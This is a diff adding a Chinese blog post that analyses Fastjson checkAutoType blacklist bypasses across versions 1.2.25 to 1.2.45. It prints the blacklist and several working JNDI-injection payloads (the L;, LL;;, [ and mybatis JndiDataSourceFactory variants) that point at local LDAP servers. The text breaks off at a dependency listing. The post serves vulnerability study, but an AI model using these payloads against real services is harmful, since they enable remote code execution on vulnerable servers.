@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Fastjson各版本绕过的poc">
+<title>Fastjson各版本绕过分析</title>
+
+<link rel='canonical' href='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/'>
+
+<link rel="stylesheet" href="/scss/style.min.4574748025b73b0369492ab661900878369bf003d477e5f5c673ee527faf3df7.css"><meta property='og:title' content="Fastjson各版本绕过分析">
+<meta property='og:description' content="Fastjson各版本绕过的poc">
+<meta property='og:url' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/'>
+<meta property='og:site_name' content='一个俗人'>
+<meta property='og:type' content='article'><meta property='article:section' content='Java' /><meta property='article:published_time' content='2025-01-08T14:49:50&#43;08:00'/><meta property='article:modified_time' content='2025-01-08T07:35:26&#43;00:00'/><meta property='og:image' content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26.jpg' />
+<meta name="twitter:title" content="Fastjson各版本绕过分析">
+<meta name="twitter:description" content="Fastjson各版本绕过的poc"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu7c49ec7d0c73aa09934b289b1d767e6f_13051_300x0_resize_box_3.png" width="300"
+                            height="302" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🤡</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">一个俗人</a></h1>
+            <h2 class="site-description">welcome two 一个俗人&#39;s 博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/gsygsr/gsygsr.github.io.git'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://gsygsr.github.io/en/" >English</option>
+                                
+                                    <option value="https://gsygsr.github.io/" selected>中文</option>
+                                
+                                    <option value="https://gsygsr.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#autotypesupport">autoTypeSupport</a></li>
+    <li><a href="#绕过">绕过</a>
+      <ol>
+        <li><a href="#1225---1241-补丁绕过">1.2.25 - 1.2.41 补丁绕过</a>
+          <ol>
+            <li><a href="#原理解析">原理解析</a></li>
+          </ol>
+        </li>
+        <li><a href="#1225-1242-补丁绕过">1.2.25-1.2.42 补丁绕过</a></li>
+        <li><a href="#1225-1243-补丁绕过">1.2.25-1.2.43 补丁绕过</a></li>
+        <li><a href="#1225-1245补丁绕过">1.2.25-1.2.45补丁绕过</a></li>
+        <li><a href="#1225-1247补丁绕过">1.2.25-1.2.47补丁绕过</a>
+          <ol>
+            <li><a href="#补丁分析">补丁分析</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#fastjson--1261-通杀">Fastjson &lt;= 1.2.61 通杀</a>
+      <ol>
+        <li><a href="#fastjson125--1259">Fastjson1.2.5 &lt;= 1.2.59</a></li>
+        <li><a href="#fastjson125--1260">Fastjson1.2.5 &lt;= 1.2.60</a></li>
+        <li><a href="#fastjson125--1261">Fastjson1.2.5 &lt;= 1.2.61</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/">
+                <img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_800x0_resize_q75_box.jpg"
+                        srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_800x0_resize_q75_box.jpg 800w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="371" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson各版本绕过分析" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="background-color: #2a9d8f; color: #fff;">
+                Java反序列化
+            </a>
+        
+            <a href="/categories/fastjson/" >
+                Fastjson
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/">Fastjson各版本绕过分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Fastjson各版本绕过的poc
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 08, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="原理">原理
+</h2><p><strong>参考博客:</strong><a class="link" href="https://drun1baby.top/2022/08/08/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8703-Fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/"  target="_blank" rel="noopener"
+    ><strong>博客</strong></a></p>
+<p>看博客分析就是出现了一个<code>checkAutoType</code>函数,会判断<code>autoTypeSupport</code>是否为true,由于<code>autoTypeSupport </code>默认为false,需要通过黑白名单变为true</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">bsh
+</span></span><span class="line"><span class="cl">com.mchange
+</span></span><span class="line"><span class="cl">com.sun.
+</span></span><span class="line"><span class="cl">java.lang.Thread
+</span></span><span class="line"><span class="cl">java.net.Socket
+</span></span><span class="line"><span class="cl">java.rmi
+</span></span><span class="line"><span class="cl">javax.xml
+</span></span><span class="line"><span class="cl">org.apache.bcel
+</span></span><span class="line"><span class="cl">org.apache.commons.beanutils
+</span></span><span class="line"><span class="cl">org.apache.commons.collections.Transformer
+</span></span><span class="line"><span class="cl">org.apache.commons.collections.functors
+</span></span><span class="line"><span class="cl">org.apache.commons.collections4.comparators
+</span></span><span class="line"><span class="cl">org.apache.commons.fileupload
+</span></span><span class="line"><span class="cl">org.apache.myfaces.context.servlet
+</span></span><span class="line"><span class="cl">org.apache.tomcat
+</span></span><span class="line"><span class="cl">org.apache.wicket.util
+</span></span><span class="line"><span class="cl">org.codehaus.groovy.runtime
+</span></span><span class="line"><span class="cl">org.hibernate
+</span></span><span class="line"><span class="cl">org.jboss
+</span></span><span class="line"><span class="cl">org.mozilla.javascript
+</span></span><span class="line"><span class="cl">org.python.core
+</span></span><span class="line"><span class="cl">org.springframework
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>之前用的就是</p>
+<p><code>com.sun.rowset.JdbcRowSetImpl</code>被ban了,没法用了</p>
+<p>试了一下之前的payload会报错</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266.png"
+	width="1116"
+	height="96"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266_hu2bedd81413b4e99b27b1c571015c972d_27934_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733224434067-276415d9-e699-4ee3-a38b-041cbb038266_hu2bedd81413b4e99b27b1c571015c972d_27934_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="1162"
+		data-flex-basis="2790px"
+	
+></p>
+<h2 id="autotypesupport">autoTypeSupport
+</h2><p><font style="color:rgb(80, 80, 92);">autoTypeSupport是</font><code>checkAutoType()</code><font style="color:rgb(80, 80, 92);">函数出现后ParserConfig.java中新增的一个配置选项，在</font><code>checkAutoType()</code><font style="color:rgb(80, 80, 92);">函数的某些代码逻辑起到开关的作用。</font></p>
+<p><font style="color:rgb(80, 80, 92);">默认情况下autoTypeSupport为False，将其设置为True有两种方法：</font></p>
+<ul>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li>
+</ul>
+<p><font style="color:rgb(80, 80, 92);">AutoType白名单设置方法：</font></p>
+<ol>
+<li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li>
+<li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li>
+<li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li>
+</ol>
+<h2 id="绕过">绕过
+</h2><h3 id="1225---1241-补丁绕过">1.2.25 - 1.2.41 补丁绕过
+</h3><p><font style="color:rgb(80, 80, 92);">既然 sun 包里面的这个 </font><code>JdbcRowSetImpl</code><font style="color:rgb(80, 80, 92);"> 类被 ban 了，尝试在 </font><code>com.sun.rowset.JdbcRowSetImpl</code><font style="color:rgb(80, 80, 92);"> 前面加一个 L，结尾加上 </font><code>;</code><font style="color:rgb(80, 80, 92);"> 绕过</font></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</span></span><span class="line"><span class="cl">String payload = &#34;{\&#34;@type\&#34;:\&#34;Lcom.sun.rowset.JdbcRowSetImpl;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:8085/SZbYoVCf\&#34;, \&#34;autoCommit\&#34;:true}&#34;;
+</span></span><span class="line"><span class="cl">JSON.parse(payload);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0.png"
+	width="1047"
+	height="733"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0_hu75a3053d36d8534c7dcc38a4901ed30e_88182_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733225882333-7c95a8be-c79b-4dbe-9a9c-3c6985f6f3b0_hu75a3053d36d8534c7dcc38a4901ed30e_88182_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="142"
+		data-flex-basis="342px"
+	
+></p>
+<p>可以绕过</p>
+<p><code>Lcom.sun.rowset.JdbcRowSetImpl;</code>这个本身是不存在的类</p>
+<h4 id="原理解析">原理解析
+</h4><p>在<code>ParserConfig.checkAutoType</code>下断点,调试的时候会进入TypeUtils的loadClass方法<img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6.png"
+	width="721"
+	height="77"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6_hu77183335c25599e2b733857383c6eb83_13960_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226639370-c607b7fc-e838-4d80-916b-61e94b4b52f6_hu77183335c25599e2b733857383c6eb83_13960_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="936"
+		data-flex-basis="2247px"
+	
+></p>
+<p>进入loadClass方法能看到绕过的核心</p>
+<p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7.png"
+	width="825"
+	height="159"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7_hu47688eeb4e22c3f0ff11ab5ca85c4067_18107_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733226679042-a1e5dcf3-4c45-4ef6-9863-b36055e51dd7_hu47688eeb4e22c3f0ff11ab5ca85c4067_18107_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="518"
+		data-flex-basis="1245px"
+	
+></p>
+<p>如果className是以<code>L</code>开头,<code>;</code>结尾的会截取掉开头结尾返回新的newClassName给loadClass</p>
+<h3 id="1225-1242-补丁绕过">1.2.25-1.2.42 补丁绕过
+</h3><p>上面的payload到了1.2.42就不行了</p>
+<p>调试到这里的时候发现传入的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>已经开头结尾已经被截取掉了<br>
+<img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8.png"
+	width="791"
+	height="532"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8_hubbeb3de7b617bf8f2e071237860a77c4_69669_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227358435-23b68757-8cae-4e5f-8faa-a9aff0168cc8_hubbeb3de7b617bf8f2e071237860a77c4_69669_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="356px"
+	
+></p>
+<p>那payload继续双写</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</span></span><span class="line"><span class="cl">String payload = &#34;{\&#34;@type\&#34;:\&#34;LLcom.sun.rowset.JdbcRowSetImpl;;\&#34;,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:8085/SZbYoVCf\&#34;, \&#34;autoCommit\&#34;:true}&#34;;
+</span></span><span class="line"><span class="cl">JSON.parse(payload);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f.png"
+	width="1047"
+	height="707"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f_hu3308956e51c5de1c4fbe491cc05b86f9_67803_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227673624-71461dea-8ee4-407d-a243-4c7f38ba4b7f_hu3308956e51c5de1c4fbe491cc05b86f9_67803_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="148"
+		data-flex-basis="355px"
+	
+></p>
+<h3 id="1225-1243-补丁绕过">1.2.25-1.2.43 补丁绕过
+</h3><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+</span></span><span class="line"><span class="cl">String payload = &#34;{\&#34;@type\&#34;:\&#34;[com.sun.rowset.JdbcRowSetImpl\&#34;[{,\&#34;dataSourceName\&#34;:\&#34;ldap://127.0.0.1:8085/SZbYoVCf\&#34;, \&#34;autoCommit\&#34;:true}&#34;;
+</span></span><span class="line"><span class="cl">JSON.parse(payload);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057.png"
+	width="636"
+	height="685"
+	srcset="/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057_hu70fa5e78297bd68325232f122f615776_47261_480x0_resize_box_3.png 480w, /java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/1733227907487-53c9d9a7-1f0c-4d5f-a04c-6421616d3057_hu70fa5e78297bd68325232f122f615776_47261_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="92"
+		data-flex-basis="222px"
+	
+></p>
+<h3 id="1225-1245补丁绕过">1.2.25-1.2.45补丁绕过
+</h3><p><strong>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</strong></p>
+<p><font style="color:rgb(80, 80, 92);">直接给出payload，要连LDAP或RMI都可以：</font></p>
+<p><strong>JSON</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">	&#34;@type&#34;:&#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&#34;,
+</span></span><span class="line"><span class="cl">	&#34;properties&#34;:
+</span></span><span class="line"><span class="cl">	{
+</span></span><span class="line"><span class="cl">		&#34;data_source&#34;:&#34;ldap://localhost:1389/Exploit&#34;
+</span></span><span class="line"><span class="cl">	}
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><font style="color:rgb(80, 80, 92);">关键PoC：</font><code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<p>依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
